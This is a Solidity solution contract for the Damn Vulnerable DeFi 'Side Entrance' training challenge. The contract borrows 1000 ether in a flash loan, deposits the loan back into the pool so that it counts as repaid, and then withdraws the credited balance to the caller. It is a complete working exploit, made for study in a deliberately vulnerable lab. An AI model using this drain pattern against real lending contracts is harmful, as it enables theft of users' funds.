// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "./SideEntranceLenderPool.sol";

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Attacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool s; 
    constructor(address _s) {
        s = SideEntranceLenderPool(_s);
    }

    function callFlashLoan() external {
        s.flashLoan(1000 ether);
    }

    function execute() external payable override {
        s.deposit{value: 1000 ether}();
    }

    function withdraw() external payable {
        s.withdraw();
        payable(msg.sender).send(address(this).balance);
    }

    receive() external payable {}
}
